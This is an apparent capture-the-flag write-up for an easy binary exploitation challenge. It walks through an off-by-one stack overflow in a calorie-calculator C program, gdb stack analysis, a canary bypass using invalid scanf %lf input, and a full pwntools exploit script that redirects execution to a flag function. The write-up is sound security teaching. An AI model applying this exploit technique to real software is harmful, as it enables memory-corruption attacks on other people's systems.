# Pwn - do_not_rewrite
Solved by **CapangJabba**

## Question
Be careful with the canary.

# Challenge File

[Download Challenge ZIP](assets/pwn-do-not-rewrite.zip)

# Writeup

Overview

This is an Easy PWN category challenge. This challenge involves basic understanding in Memory Layout, and Return Oriented Programming. There is a Out of Bound vulnerability in the program where we can overwrite the RIP. 

# Intial Analysis

## File Analysis

To know more about the given executable, we can use `file` command.

```bash
file chall

chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5d735b26ab89ecf497388a07656e2d9e1655d432, for GNU/Linux 3.2.0, with debug_info, not stripped
```

Key Findings:- 
1. **ELF 64-bit**: The file is in the ELF format and is a 64-bit binary. This means it is designed to run on a 64-bit architecture
2. **not stripped**: The executable has not had its symbol table and relocation information removed. This means it includes more information which can be helpful for debugging, but makes the file larger.

## Executable Security Check

To figure out what security mitigations enabled in this executable, we can use `checksec` command that comes with `pwntools` library



```bash
checksec --file chall 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Key Findings:-

1. Stack: Canary found:

Stack Canaries: A canary is a security feature that helps prevent stack buffer overflow attacks. If the canary value is altered (indicative of a buffer overflow), the program will terminate to prevent exploitation.

2. NX: NX enabled:

NX (No-eXecute): This indicates that the executable has the NX bit enabled. The NX bit marks certain areas of memory as non-executable, which helps prevent execution of malicious code injected into these areas (e.g., via buffer overflows).

3. PIE: PIE enabled:

PIE (Position Independent Executable): This means that the executable is position-independent, allowing it to be loaded at any address in memory. This enhances security through Address Space Layout Randomization (ASLR), making it more difficult for attackers to predict the location of specific code and data


# Code Analysis

main.c
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    double calories_per_gram;
    double amount_in_grams;
    char name[50];
} Ingredient;

void init(){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    alarm(180);
}

void show_flag(){
    printf("\nExcellent!\n");
    system("cat FLAG");
}

double calculate_total_calories(Ingredient ingredients[], int num_ingredients) {
    double total_calories = 0.0;
    for (int i = 0; i < num_ingredients; i++) {
        total_calories += ingredients[i].calories_per_gram * ingredients[i].amount_in_grams;
    }
    return total_calories;
}

int main() {
    init();

    Ingredient ingredients[3];
    printf("hint: show_flag = %p\n", (void *)show_flag);

    for (int i = 0; i <= 3; i++) {
        printf("\nEnter the name of ingredient %d: ", i + 1);
        scanf("%s", ingredients[i].name);

        printf("Enter the calories per gram for %s: ", ingredients[i].name);
        scanf("%lf", &ingredients[i].calories_per_gram);

        printf("Enter the amount in grams for %s: ", ingredients[i].name);
        scanf("%lf", &ingredients[i].amount_in_grams);
    }

    double total_calories = calculate_total_calories(ingredients, 3);

    printf("\nTotal calories for the meal: %.2f kcal\n", total_calories);

    return 0;
}
```

Code Summary:-

- Function `show_flag()` is our target.
- The program collects details about three ingredients from the user (name, calories per gram, and amount in grams).
- It calculates the total calories of the meal based on the input.
- It displays the total calories to the user.

## Issue

**Buffer Overflow** / **Out of Bound**

```C
for (int i = 0; i <= 3; i++)
```

The loop in the main function iterates one time too many, which will cause a buffer overflow when accessing `ingredients[3]`.

# Payload Crafting

## Testing OOB write

In the previous section, we found that there is a OOB write in the loop function where writing into `ingredients[3]` is accessible although allocated memory only up until `ingredients[2]`. But, what exactly do we overwrite on `ingredients[3]`.

```bash
hint: show_flag = 0x55555555525f

Enter the name of ingredient 1: a
Enter the calories per gram for a: 1.0
Enter the amount in grams for a: 1.0

Enter the name of ingredient 2: b
Enter the calories per gram for b: 2.0
Enter the amount in grams for b: 2.0

Enter the name of ingredient 3: c
Enter the calories per gram for c: 3.0
Enter the amount in grams for c: 3.0

Enter the name of ingredient 4: d
Enter the calories per gram for d: 1.0
Enter the amount in grams for d: 1.0

Total calories for the meal: 14.00 kcal
*** stack smashing detected ***: terminated

Program received signal SIGABRT, Aborted.
```

This first test run shows that stack canary were successfully overwritten. But when do we overwritten the stack canary?

Is it at `Enter the name of ingredient 4: d`? Is it at `Enter the calories per gram for d: 1.0`?

## Stack Analysis

To figure this out, setting a breakpoints before program ends (to identify what were overwritten), and before inputs are required. Debugger such as `gdb` will be use including the `pwndbg` plugin

```python
First Breakpoint 
This is at the start of the program
0x000055555555533b <+30>:	mov    eax,0x0

Second Breakpoint
This is before checking if stack canary were overwritten
0x000055555555551f <+514>:	je     0x555555555526 <main+521>
```

```python
b *0x000055555555533b
Breakpoint 1 at 0x55555555533b: file main.c, line 32.
pwndbg> b *0x000055555555551f
Breakpoint 2 at 0x55555555551f: file main.c, line 53.
```

Time to run the program again and then check the stack

At breakpoint 1

using command `telescope rsp 40`  which means we are checking the RSP register for 40 values. 

```python
tele rsp 40
00:0000│ rsp 0x7fffffffdbb0 ◂— 0xc0
01:0008│-0e8 0x7fffffffdbb8 —▸ 0x7ffff7fe1214 (init_cpu_features.constprop+1268) ◂— mov eax, dword ptr [rip + 0x1b942]
02:0010│-0e0 0x7fffffffdbc0 —▸ 0x7fffffffdc70 ◂— 0x0
03:0018│-0d8 0x7fffffffdbc8 ◂— 0x1000000
04:0020│-0d0 0x7fffffffdbd0 ◂— 0x80000
05:0028│-0c8 0x7fffffffdbd8 ◂— 0x1000000
06:0030│-0c0 0x7fffffffdbe0 ◂— 0xc00000
07:0038│-0b8 0x7fffffffdbe8 ◂— 0xc00000
08:0040│-0b0 0x7fffffffdbf0 ◂— 0x8
09:0048│-0a8 0x7fffffffdbf8 ◂— 0x40 /* '@' */
0a:0050│-0a0 0x7fffffffdc00 ◂— 0x80000
0b:0058│-098 0x7fffffffdc08 ◂— 0x8
0c:0060│-090 0x7fffffffdc10 ◂— 0x10
0d:0068│-088 0x7fffffffdc18 ◂— 0x40 /* '@' */
0e:0070│-080 0x7fffffffdc20 ◂— 0x19
0f:0078│-078 0x7fffffffdc28 ◂— 0x0
... ↓        11 skipped
1b:00d8│-018 0x7fffffffdc88 —▸ 0x7ffff7fe6c40 (dl_main) ◂— push rbp
1c:00e0│-010 0x7fffffffdc90 ◂— 0x0
1d:00e8│-008 0x7fffffffdc98 ◂— 0xfa0d90893da85500
1e:00f0│ rbp 0x7fffffffdca0 ◂— 0x1
1f:00f8│+008 0x7fffffffdca8 —▸ 0x7ffff7decc8a (__libc_start_call_main+122) ◂— mov edi, eax
```

Key Findings:-

1. at ` 0x7fffffffdc98 ◂— 0xfa0d90893da85500` is the canary
2. at `0x7fffffffdca8 —▸ 0x7ffff7decc8a (__libc_start_call_main+122)` is the return address when program ends

Continue the program using command `continue` in gdb

Next give these inputs:-

```python
hint: show_flag = 0x55555555525f

Enter the name of ingredient 1: a
Enter the calories per gram for a: 1.0
Enter the amount in grams for a: 1.0

Enter the name of ingredient 2: b
Enter the calories per gram for b: 2.0
Enter the amount in grams for b: 2.0

Enter the name of ingredient 3: c
Enter the calories per gram for c: 3.0
Enter the amount in grams for c: 3.0

Enter the name of ingredient 4: AAAAAAAA
Enter the calories per gram for AAAAAAAA: 5.0
Enter the amount in grams for AAAAAAAA: 5.0

Total calories for the meal: 14.00 kcal
Breakpoint 2, 0x000055555555551f in main () at main.c:53
```

```python
pwndbg> tele rsp 40
00:0000│ rsp 0x7fffffffdbb0 ◂— 0x4000000c0
01:0008│-0e8 0x7fffffffdbb8 ◂— 0x402c000000000000
02:0010│-0e0 0x7fffffffdbc0 ◂— 0x3ff0000000000000
03:0018│-0d8 0x7fffffffdbc8 ◂— 0x3ff0000000000000
04:0020│-0d0 0x7fffffffdbd0 ◂— 0x80061 /* 'a' */
05:0028│-0c8 0x7fffffffdbd8 ◂— 0x1000000
06:0030│-0c0 0x7fffffffdbe0 ◂— 0xc00000
07:0038│-0b8 0x7fffffffdbe8 ◂— 0xc00000
08:0040│-0b0 0x7fffffffdbf0 ◂— 0x8
09:0048│-0a8 0x7fffffffdbf8 ◂— 0x40 /* '@' */
0a:0050│-0a0 0x7fffffffdc00 ◂— 0x80000
0b:0058│-098 0x7fffffffdc08 ◂— 0x4000000000000000
0c:0060│-090 0x7fffffffdc10 ◂— 0x4000000000000000
0d:0068│-088 0x7fffffffdc18 ◂— 0x62 /* 'b' */
0e:0070│-080 0x7fffffffdc20 ◂— 0x19
0f:0078│-078 0x7fffffffdc28 ◂— 0x0
... ↓        4 skipped
14:00a0│-050 0x7fffffffdc50 ◂— 0x4008000000000000
15:00a8│-048 0x7fffffffdc58 ◂— 0x4008000000000000
16:00b0│-040 0x7fffffffdc60 ◂— 0x63 /* 'c' */
17:00b8│-038 0x7fffffffdc68 ◂— 0x0
... ↓        3 skipped
1b:00d8│-018 0x7fffffffdc88 —▸ 0x7ffff7fe6c40 (dl_main) ◂— push rbp
1c:00e0│-010 0x7fffffffdc90 ◂— 0x0
1d:00e8│-008 0x7fffffffdc98 ◂— 0x4014000000000000
1e:00f0│ rbp 0x7fffffffdca0 ◂— 0x4014000000000000
1f:00f8│+008 0x7fffffffdca8 ◂— 'AAAAAAAA
```

Previously we find that

1. at ` 0x7fffffffdc98 ◂— 0xfa0d90893da85500` is the canary
2. at `0x7fffffffdca8 —▸ 0x7ffff7decc8a (__libc_start_call_main+122)` is the return address when program ends

But now those values are overwritten

1. Canary were overwritten `0x7fffffffdc98 ◂— 0x4014000000000000`
2. Return address were overwritten `0x7fffffffdca8 ◂— 'AAAAAAAA`

What were done here are:-

at input `Enter the name of ingredient 4: AAAAAAAA`, return address were overwritten and at 
`Enter the calories per gram for AAAAAAAA: 5.0` or `Enter the amount in grams for AAAAAAAA: 5.0`  the stack canary were overwritten.

To conclude our findings:-
1. Overwrite the return address into `show_flag()` address.
2. Bypass input for `Enter the calories per gram for` and `Enter the amount in grams for` 

But how to not input anything to those required input? Back to the code review on that part.

```C
printf("Enter the calories per gram for %s: ", ingredients[i].name);
scanf("%lf", &ingredients[i].calories_per_gram);

printf("Enter the amount in grams for %s: ", ingredients[i].name);
scanf("%lf", &ingredients[i].amount_in_grams);
```

The `%lf` format specifier in `scanf` is used to read a `double` value from the input. `%lf` expects a double value, which is a number that can contain a decimal point. Characters or strings that do not represent a valid floating-point number are **not considered valid** input for `%lf`. If the input contains characters that cannot be part of a floating-point number (e.g., alphabetic characters, punctuation that isn't part of a number), `scanf` will stop reading at the first invalid character and the value at the provided memory location remain unchanged.

With that being said, we can give 'a' as input, and the stack canary will remain the same. Thus, stack canary bypassed.

## Implementation 

At the start of the program, it will print out the address for `show_flag()`. This is important because previously, PIE were found enabled causing the base address of this program will be randomized each run. `pwntools` and python it self has functions that allow us extracting this value and use it easily 

```python
io.recvuntil(b'hint: show_flag = ')
flag = int(io.recvline().strip(), 16)
print(f'Flag: {hex(flag)}')
```

1. `io.recvuntil(b'hint: show_flag = ')`: This line reads data from the remote service or process until the specified byte string `b'hint: show_flag = '` is encountered. The `recvuntil` function is commonly used in binary exploitation to synchronize the script with the program's output.
2. `io.recvline()`: This function reads a line of data from the remote service or process. It continues to read until it encounters a newline character (`\n`).
3. `.strip()`: This method removes any leading and trailing whitespace characters (including newline characters) from the string.
4. `int(..., 16)`: The `int` function converts the stripped string to an integer, interpreting it as a hexadecimal number (base 16). This conversion is necessary because the memory address provided by the `show_flag` hint is in hexadecimal format.

Next we need to feed the first 3 iterations with valid inputs.

```python
io.recvuntil(b'Enter the name of ingredient 1: ')
io.sendline(b'a')
io.recvuntil(b'Enter the calories per gram for a: ')
io.sendline(b'1.2')
io.recvuntil(b'Enter the amount in grams for a: ')
io.sendline(b'1.3')

io.recvuntil(b'Enter the name of ingredient 2: ')
io.sendline(b'a')
io.recvuntil(b'Enter the calories per gram for a: ')
io.sendline(b'1.4')
io.recvuntil(b'Enter the amount in grams for a: ')
io.sendline(b'2.0')

io.recvuntil(b'Enter the name of ingredient 3: ')
io.sendline(b'a')
io.recvuntil(b'Enter the calories per gram for a: ')
io.sendline(b'3.1')
io.recvuntil(b'Enter the amount in grams for a: ')
io.sendline(b'2.3')
```

There is much simpler way to do it, But just let it slide for once. ;D


Next is the payload, which is the `show_flag()` address. Currently what we have is the address in integer format, we need to send the payload in a suitable format as input. `pwntools` has a function for this which is `p64(<show_flag() address>)`. However, due to stack allignment issues, we need to include a `ret` gadget before the `show_flag()` address to avoid unnecessary headache. For the sack of keeping this writeup not too long, this [tutorial](https://shantoroy.com/security/using-ropper-to-find-address-of-gadgets/) shows how to use `ropper`.

```python
base_add =  flag - elf.sym['show_flag']
ret = base_add + 0x101a
payload = p64(ret)
payload += p64(flag)

```

Now its time to put everything together. Here is the full script

```python 
from pwn import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./chall", )
elf = context.binary = ELF("./chall", checksec=False)
rop = ROP(elf)
context.log_level = 'debug'

io.recvuntil(b'hint: show_flag = ')
flag = int(io.recvline().strip(), 16)
print(f'Flag: {hex(flag)}')

io.recvuntil(b'Enter the name of ingredient 1: ')
io.sendline(b'a')
io.recvuntil(b'Enter the calories per gram for a: ')
io.sendline(b'1.2')
io.recvuntil(b'Enter the amount in grams for a: ')
io.sendline(b'1.3')

io.recvuntil(b'Enter the name of ingredient 2: ')
io.sendline(b'a')
io.recvuntil(b'Enter the calories per gram for a: ')
io.sendline(b'1.4')
io.recvuntil(b'Enter the amount in grams for a: ')
io.sendline(b'2.0')

io.recvuntil(b'Enter the name of ingredient 3: ')
io.sendline(b'a')
io.recvuntil(b'Enter the calories per gram for a: ')
io.sendline(b'3.1')
io.recvuntil(b'Enter the amount in grams for a: ')
io.sendline(b'2.3')

io.recvuntil(b'Enter the name of ingredient 4: ')

base_add =  flag - elf.sym['show_flag']
ret = base_add + 0x101a
payload = p64(ret)
payload += p64(flag)
print(f'base_add: {hex(base_add)}')
io.sendline(payload)
io.sendline(b'aaaa')

io.interactive()
```

![Flag](assests/flag.png)


### Flag
`FLAG{B3_c4r3fu1_wh3n_using_th3_f0rm4t_sp3cifi3r_1f_in_sc4nf}`
